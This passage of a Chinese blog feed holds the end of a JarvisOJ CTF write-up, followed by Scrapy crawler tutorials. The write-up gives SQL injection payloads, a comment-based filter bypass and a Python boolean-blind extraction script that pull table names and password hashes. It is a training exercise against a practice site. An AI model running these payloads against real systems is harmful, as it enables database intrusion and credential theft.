class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_&#123;$table&#125;`</span><br></pre></td></tr></table></figure><p>desc命令可以用来查看表结构也可以用来排序，看本题中的用法可以知道是查看表结构，所以desc命令后面接的表名要存在才能执行成功。<br>而语句中用了反引号，那么就可以采用闭合反引号来进行注入。<br>尝试构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table&#x3D;test&#96; &#96;union select user()</span><br></pre></td></tr></table></figure><p>闭合后</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> `secret_test` `<span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>()`</span><br></pre></td></tr></table></figure><p>因为secret_test表存在所以desc语句成功执行。<br>接下来拼接的sql语句就变为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span> <span class="keyword">from</span> secret_test` `<span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>()</span><br></pre></td></tr></table></figure><p>语句中的两个反引号就相当于空格了，但是回显仍然是flag{xxx}。<br>这是因为只echo查询结果中的第一条记录。所以我们需要使用limit来进行约束。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table&#x3D;test&#96; &#96;union select user() limit 1,1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20190930185704.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20190930185718.png" alt=""><br>拿到了当前用户，接下来就可以进行常规的注入操作了。<br>查询表名  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?table&#x3D;test&#96; &#96;union select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1</span><br></pre></td></tr></table></figure><p>返回表名为secret_flag，然后查字段名  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?table&#x3D;test&#96; &#96;union select column_name from information_schema.columns where table_name&#x3D;0x7365637265745f666c6167 limit 1,1</span><br></pre></td></tr></table></figure><p>返回字段名为flagUwillNeverKnow，爆值  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?table&#x3D;test&#96; &#96;union select flagUwillNeverKnow from secret_flag limit 1,1</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure><h2 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h2><p>题目入口：<a href="http://web.jarvisoj.com:32787/">http://web.jarvisoj.com:32787/</a>  </p><p>访问显示一个登录框<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191002113338.png" alt=""><br>发现用户名为admin时，显示密码错误，其它则显示用户名错误。测试一下万能密码不行。用户名查询和密码查询是分开写的。<br>考虑在用户名这个可以采用布尔注入。<br>测试一下：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39; and &#39;1&#39;&#x3D;&#39;1&#39;#&amp;password&#x3D;2  &#x2F;&#x2F;显示密码错误，说明用户名查询为真</span><br><span class="line">username&#x3D;admin&#39; and &#39;1&#39;&#x3D;&#39;2&#39;#&amp;password&#x3D;2  &#x2F;&#x2F;显示用户名错误，说明用户名查询为假</span><br></pre></td></tr></table></figure><p>后面踩了些坑，具体不叙述，测试发现是过滤了空格，所以采用注释的形式绕过。<br>尝试手工爆数据库名  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr(database(),1,1))&gt;100#&amp;password&#x3D;2  &#x2F;&#x2F;密码错误</span><br><span class="line">username&#x3D;admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr(database(),1,1))&gt;110#&amp;password&#x3D;2  &#x2F;&#x2F;用户名错误</span><br><span class="line">username&#x3D;admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr(database(),1,1))&gt;105#&amp;password&#x3D;2  &#x2F;&#x2F;用户名错误</span><br><span class="line">username&#x3D;admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr(database(),1,1))&gt;103#&amp;password&#x3D;2  &#x2F;&#x2F;密码错误</span><br><span class="line">username&#x3D;admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr(database(),1,1))&gt;104#&amp;password&#x3D;2  &#x2F;&#x2F;密码错误</span><br></pre></td></tr></table></figure><p>按照逻辑，库名第一个字符的ascii&gt;104为真，&gt;105为假，那就是105了，对应&#39;i&#39;字符。<br>接下来写脚本进行测试  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line">chars = string.ascii_letters + string.digits + string.punctuation  <span class="comment">#为了保险，使用数字+大小写+标点符号作为字典</span></span><br><span class="line">url = <span class="string">&quot;http://web.jarvisoj.com:32787/login.php&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">usernameTamplate = <span class="string">&quot;admin&#x27;/*1*/and/*1*/ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;#&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):  <span class="comment">#range范围按实际情况修改</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload[<span class="string">&quot;username&quot;</span>] = usernameTamplate.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(j))</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(r.text) == <span class="number">1191</span>):  <span class="comment">#1191是密码错误时的响应长度</span></span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">&quot;database:&quot;</span> + result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;数据库名结束&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191002120350.png" alt=""><br>脚本测试通过。<br>那么只需修改一下语句就可以爆表、字段和值了。下面给相关语句：<br>爆表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr((select&#x2F;*1*&#x2F;table_name&#x2F;*1*&#x2F;from&#x2F;*1*&#x2F;information_schema.tables&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_schema&#x3D;database()),1,1))&#x3D;1#</span><br></pre></td></tr></table></figure><p>得到表名为admin，再爆列名  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr((select&#x2F;*1*&#x2F;group_concat(column_name)&#x2F;*1*&#x2F;from&#x2F;*1*&#x2F;information_schema.columns&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_name&#x3D;0x61646d696e),1,1))&#x3D;1#</span><br></pre></td></tr></table></figure><p>用group_concat爆出表名有id,username,password<br>再把值爆出来，为了方便,只爆password字段  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;ascii(substr((select&#x2F;*1*&#x2F;group_concat(password)&#x2F;*1*&#x2F;from&#x2F;*1*&#x2F;admin),1,1))&#x3D;1#</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191002130325.png" alt=""><br>MD5加密，解密得明文：eTAloCrEP<br>登录得到flag<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191002130508.png" alt="">  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;s1mpl3_1nJ3ction_very_easy!!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;babyphp&quot;&gt;&lt;a href=&quot;#babyphp&quot; class=&quot;headerlink&quot; title=&quot;babyphp&quot;&gt;&lt;/a&gt;babyphp&lt;/h2&gt;&lt;p&gt;题目入口：&lt;a href=&quot;http://web.jarvisoj.com:32798/&quot;&gt;http://web.jarvisoj.com:32798/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看到说了用git考虑到git泄露  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190928232517.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;试一下&lt;a href=&quot;http://web.jarvisoj.com:32798/.git/HEAD&quot;&gt;http://web.jarvisoj.com:32798/.git/HEAD&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190929111746.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;确定存在泄露，祭出工具GitHack  &lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python GitHack.py http:&amp;#x2F;&amp;#x2F;web.jarvisoj.com:32798&amp;#x2F;.git&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190928233528.png&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="JarvisOJ" scheme="https://sncker.github.io/blog/tags/JarvisOJ/"/>
    
  </entry>
  
  <entry>
    <title>Python网络爬虫-Scrapy爬取美剧TOP100</title>
    <link href="https://sncker.github.io/blog/2019/08/09/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Scrapy%E7%88%AC%E5%8F%96%E7%BE%8E%E5%89%A7TOP100/"/>
    <id>https://sncker.github.io/blog/2019/08/09/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Scrapy%E7%88%AC%E5%8F%96%E7%BE%8E%E5%89%A7TOP100/</id>
    <published>2019-08-09T14:11:00.000Z</published>
    <updated>2020-01-02T12:28:11.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python网络爬虫-Scrapy爬取美剧TOP100"><a href="#Python网络爬虫-Scrapy爬取美剧TOP100" class="headerlink" title="Python网络爬虫-Scrapy爬取美剧TOP100"></a>Python网络爬虫-Scrapy爬取美剧TOP100</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来Scrapy实例想写教授的那个股票数据爬虫，但是感觉不太全，所以自己另写一个实例，如题。<br>这个实例也是Python实验中的一个，当时也是没时间，所以又是应付式，，，现在重新写一次。 </p><a id="more"></a><h2 id="美剧TOP100爬虫"><a href="#美剧TOP100爬虫" class="headerlink" title="美剧TOP100爬虫"></a>美剧TOP100爬虫</h2><p><strong>目标网址</strong>：<a href="https://www.meijutt.com/new100.html">https://www.meijutt.com/new100.html</a>  </p><p>直接在之前创建的scrapydemo工程中新建一个爬虫：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">scrapy genspider meijv meijutt.com</span></span><br></pre></td></tr></table></figure><p>先编写items.py，这个实例打算爬取排名和电影名字，我们使用两个字段：rank和name<br><strong>item.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScrapydemoItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MeijvItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    rank = scrapy.Field()</span><br><span class="line">    name = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再编写meijv爬虫<br><strong>meijv.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MeijvItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MeijvSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;meijv&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;meijutt.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.meijutt.com/new100.html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = MeijvItem()</span><br><span class="line">        ranks = response.css(<span class="string">&quot;body .top-list i::text&quot;</span>).extract()</span><br><span class="line">        names = response.css(<span class="string">&quot;body .top-list a::text&quot;</span>).extract()</span><br><span class="line">        <span class="keyword">for</span> rank, name <span class="keyword">in</span> <span class="built_in">zip</span>(ranks, names):</span><br><span class="line">            item[<span class="string">&#x27;rank&#x27;</span>] = rank</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先在items.py中导入我们刚才编写的MeijvItem类，然后实例化一个对象。<br>使用CSS Selector来提取我们的信息。<br>数据装入item中，用yield返回给Pipeline。  </p><p>接下来编写Pipeline<br><strong>pipelines.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScrapydemoPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MeijvPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.f = <span class="built_in">open</span>(<span class="string">&quot;meijv100.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        line = <span class="string">&quot;%s，%s\n&quot;</span> % (item[<span class="string">&#x27;rank&#x27;</span>], item[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        self.f.write(line)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.f.close()</span><br></pre></td></tr></table></figure><p>手动创建一个Pipeline类，process_item()方法是必须的，参考教授的写法，把open_spider()和close_spider()方法也写上。<br>容器管道用于清洗数据，给数据去重，储存等，这里就直接储存到文本中。  </p><p>还要在setting.py中设置ITEM_PIPELINES<br><strong>setting.py</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="comment"># &#x27;scrapydemo.pipelines.ScrapydemoPipeline&#x27;: 300,</span></span><br><span class="line">    <span class="string">&#x27;scrapydemo.pipelines.MeijvPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就可以运行我们的爬虫了  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">scrapy crawl meijv</span></span><br></pre></td></tr></table></figure><p>最后还有一点，一个工程中会有多个爬虫，不同爬虫有不同的处理逻辑，这时需要为爬虫指定Pipeline。<br>可以使用Spider类的custom_settings属性,像这样  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">custom_settings = &#123;</span><br><span class="line">    <span class="string">&#x27;ITEM_PIPELINES&#x27;</span>: &#123;<span class="string">&#x27;scrapydemo.pipelines.MeijvPipeline&#x27;</span>: <span class="number">300</span>, &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>差不多就这样，运行后查看爬取结果。<br><strong>meijv.txt</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1，私家侦探第三季</span><br><span class="line">2，美爪屋第三季</span><br><span class="line">3，厨艺大师第十季</span><br><span class="line">....</span><br><span class="line">98，信任之危第二季</span><br><span class="line">99，时间隧道第一季</span><br><span class="line">100，处女情缘第五季</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>Scrapy框架结束。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Python网络爬虫-Scrapy爬取美剧TOP100&quot;&gt;&lt;a href=&quot;#Python网络爬虫-Scrapy爬取美剧TOP100&quot; class=&quot;headerlink&quot; title=&quot;Python网络爬虫-Scrapy爬取美剧TOP100&quot;&gt;&lt;/a&gt;Python网络爬虫-Scrapy爬取美剧TOP100&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本来Scrapy实例想写教授的那个股票数据爬虫，但是感觉不太全，所以自己另写一个实例，如题。&lt;br&gt;这个实例也是Python实验中的一个，当时也是没时间，所以又是应付式，，，现在重新写一次。 &lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Python网络爬虫-Scrapy框架</title>
    <link href="https://sncker.github.io/blog/2019/08/04/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Scrapy%E6%A1%86%E6%9E%B6/"/>
    <id>https://sncker.github.io/blog/2019/08/04/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-Scrapy%E6%A1%86%E6%9E%B6/</id>
    <published>2019-08-04T02:19:00.000Z</published>
    <updated>2020-01-02T12:28:25.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Scrapy框架"><a href="#Scrapy框架" class="headerlink" title="Scrapy框架"></a>Scrapy框架</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Scrapy是第三方的库，直接来一手</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>依赖问题看报错解决</p><a id="more"></a><h2 id="框架解析"><a href="#框架解析" class="headerlink" title="框架解析"></a>框架解析</h2><p>Scrapy框架用的5个模块加2个中间件  </p><p><strong>模块：</strong>  </p><ol><li>SPIDERS</li><li>ENGINE</li><li>SCHEDULER</li><li>DOWNLOADER</li><li>ITEM PIPELINES  </li></ol><p><strong>中间件：</strong>   </p><ol><li>Spider Middleware</li><li>Downloader Middleware</li></ol><hr><p>各模块形成三条数据流路径，其中传输的数据有REQUESTS/RESPONSE/ITEMS<br>请求和响应不BB，ITEMS是一种容器，类似字典，我们通过编写SPIDER来将页面中非结构化的数据解析出来并存入ITEM中，成为结构化的信息。<br>模块功能通过名字很容易理解:  </p><ul><li>ENGINE是负责将数据分发到各模块的中枢  </li><li>SPIDERS是我们编写的小爬虫，负责爬取内容并解析数据</li><li>SCHEDULER负责调度请求顺序  </li><li>DOWNLOADER下载器，负责请求，实实在在的页面访问，并拿到响应  </li><li>ITEM PIPELINES负责数据(ITMES)的处理  </li></ul><p><strong>模块形成的三条数据流路径：</strong>  </p><ol><li>由<strong>SPIDERS</strong>提供的<strong>REQUESTS</strong>请求经<strong>ENGINE</strong>中转到<strong>SCHEDULER</strong>中  </li><li><strong>SCHEDULER</strong>中的<strong>REQUESTS</strong>请求由<strong>ENGINE</strong>提交给<strong>DOWNLOADER</strong>，<strong>DOWNLOADER</strong>将对应的响应（<strong>RESPONSE</strong>）经<strong>ENGINE</strong>返回给<strong>SPIDERS</strong>   </li><li><strong>SPIDERS</strong>在<strong>RESPONSE</strong>中解析出<strong>ITEMS</strong>和<strong>REQUESTS</strong>，其中<strong>REQUESTS</strong>会从第一条路径继续重复，而<strong>ITEMS</strong>就会经<strong>ENGINE</strong>到达<strong>ITEM PIPELINES</strong></li></ol><p>用文字描述很抽象，因为懒得找图床来放图片，但是也很清晰了。  </p><p>关于中间件<br>首先两个中间件连接在相应模块与ENGINE模块之间，可以自定义，但一般不用改动<br>Spider中间件用于处理Response中提取的Rqeuests和Items，自定义可以定义一些方法，比如当Response通过Spider中间件时会调用process_spider_input(response, spider)返回None，异常时也会调用process_spider_exception(response, exception, spider)，这些方法主体都可以自行编写。<br>Downloader中间件处理request和response，可以设定全局参数，比如代理ip，自定义头等，是反反爬虫的关键。  </p><p>scrapy框架能单独写一本书出来，靠这一小节视频学的都是皮毛，但是上手还是非常容易的。作为一个成熟的框架，即使是一个python新手也能很快用起来，这个框架入门其实就是做填空题，五个模块中我们只需要配置好生成的SPIDER和对应的ITEM PIPELINE即可，其它的模块功能框架已经实现了。  </p><h2 id="对比requests库"><a href="#对比requests库" class="headerlink" title="对比requests库"></a>对比requests库</h2><p>两者是python爬虫的两条重要路线，它们都可以对页面进行请求和爬取，有丰富的文档，入门简单。同时两者都没有处理js，提交表单，应对验证码等功能（可拓展）。  </p><p><strong>不同点：</strong>  </p><table><thead><tr><th>requests</th><th>Scrapy</th></tr></thead><tbody><tr><td>页面级爬虫</td><td>网站级爬虫</td></tr><tr><td>功能库</td><td>框架</td></tr><tr><td>并发性考虑不足，性能较差</td><td>并发性好，性能较高</td></tr><tr><td>重点在于页面下载</td><td>重点在于爬虫结构</td></tr><tr><td>定制灵活</td><td>一般定制灵活，深度定制困难</td></tr><tr><td>上手十分简单</td><td>入门稍难</td></tr></tbody></table><p><strong>路线选择:</strong>  </p><p>非常小的需求，requests库<br>不太小的需求，Scrapy框架<br>定制程度很高的需求（不考虑规模），自搭框架，requests &gt; Scrapy  </p><h2 id="Scrapy常用命令"><a href="#Scrapy常用命令" class="headerlink" title="Scrapy常用命令"></a>Scrapy常用命令</h2><p>scrapy库提供了scrapy终端</p><pre><code>&gt;scrapy -h</code></pre><p>即可看到使用帮助  </p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><table><thead><tr><th>命令</th><th>说明</th><th>格式</th></tr></thead><tbody><tr><td>startproject</td><td>创建一个新工程</td><td>scrapy startproject &lt;name&gt; [dir]</td></tr><tr><td>genspider</td><td>创建一个爬虫</td><td>scrapy genspider [options] &lt;name&gt; &lt;domain&gt;</td></tr><tr><td>settings</td><td>获得爬虫配置信息</td><td>scrapy settings [options]</td></tr><tr><td>crawl</td><td>运行一个爬虫</td><td>scrapy crawl &lt;spider&gt;</td></tr><tr><td>list</td><td>列出工程中所有爬虫</td><td>scrapy list</td></tr><tr><td>shell</td><td>启动URL调试命令行</td><td>scrapy shell [url]</td></tr></tbody></table><h2 id="Scrapy框架简单使用"><a href="#Scrapy框架简单使用" class="headerlink" title="Scrapy框架简单使用"></a>Scrapy框架简单使用</h2><p>scrapy简单使用步骤  </p><ol><li>建立一个爬虫工程  </li><li>在工程中生成一个scrapy爬虫  </li><li>配置生成的spider爬虫  </li><li>运行爬虫，获取网页  </li></ol><h3 id="1-建立一个爬虫工程"><a href="#1-建立一个爬虫工程" class="headerlink" title="1.建立一个爬虫工程"></a>1.建立一个爬虫工程</h3><p>创建工程，使用startproject  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\北京理工网络爬虫\project&gt;scrapy startproject scrapydemo</span><br><span class="line">New Scrapy project &#x27;scrapydemo&#x27;, using template directory &#x27;d:\python\python37\lib\site-packages\scrapy\templates\project&#x27;, created in:</span><br><span class="line">    E:\北京理工网络爬虫\project\scrapydemo</span><br><span class="line"></span><br><span class="line">You can start your first spider with:</span><br><span class="line">    cd scrapydemo</span><br><span class="line">    scrapy genspider example example.com</span><br></pre></td></tr></table></figure><p>这样就创建了一个工程，在目录下产生了一个scrapydemo的工程文件夹  </p><ul><li>scrapydemo/——————外层目录<ul><li>scrapy.cfg—————-部署配置，在服务器上部署scrapy时使用，本地不用</li><li>scrapydemo/—————框架的用户自定义Python代码<ul><li>__init__.py——-初始化脚本</li><li>items.py————–Items代码模板（继承类）</li><li>middlewares.py——–Middlewares代码模板（继承类）</li><li>pipelines.py———-Pipelines代码模板（继承类）</li><li>settings.py———–Scrapy爬虫配置文件</li><li>spiders/————–Spiders代码模板目录（继承类）<ul><li>__init__.py——初始文件，无需修改</li></ul></li></ul></li></ul></li></ul><h3 id="2-在工程中生成一个scrapy爬虫"><a href="#2-在工程中生成一个scrapy爬虫" class="headerlink" title="2.在工程中生成一个scrapy爬虫"></a>2.在工程中生成一个scrapy爬虫</h3><p>切换到工程文件夹中，使用genspider生成一个爬虫  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 